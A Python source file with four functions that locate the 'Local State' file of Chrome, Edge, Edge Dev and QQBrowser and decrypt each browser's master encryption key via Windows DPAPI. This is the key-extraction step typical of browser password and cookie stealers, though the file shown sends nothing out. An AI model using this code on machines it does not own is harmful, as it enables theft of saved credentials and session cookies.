import base64
import json
import os
import win32crypt


def get_encryption_key_chrome():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    if os.path.exists(local_state_path):
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])

        key = key[5:]
    else:
        return ''

    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def get_encryption_key_edge():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Microsoft", "Edge",
                                    "User Data", "Local State")
    if os.path.exists(local_state_path):
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])

        key = key[5:]
    else:
        return ''

    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def get_encryption_key_edge_dev():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Microsoft", "Edge Dev",
                                    "User Data", "Local State")


    if os.path.exists(local_state_path):
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])

        key = key[5:]
    else:
        return ''

    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

# C:\Users\sorye\AppData\Local\Tencent\QQBrowser\User Data

def get_encryption_key_qq():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Tencent", "QQBrowser",
                                    "User Data", "Local State")
    if os.path.exists(local_state_path):
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])

        key = key[5:]
    else:
        return ''

    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]